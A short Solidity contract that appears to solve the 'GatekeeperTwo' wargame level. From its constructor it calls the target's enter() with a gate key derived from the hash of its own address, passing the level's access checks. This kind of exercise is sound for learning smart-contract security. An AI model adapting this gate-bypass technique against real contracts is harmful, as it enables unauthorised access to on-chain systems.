// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract AttackGatekeeperTwo {
    IGatekeeperTwo gatekeeper;

    constructor(address _gatekeeper) {
        IGatekeeperTwo(_gatekeeper).enter(
            bytes8(~uint64(bytes8(keccak256(abi.encodePacked(address(this))))))
        );
    }
}
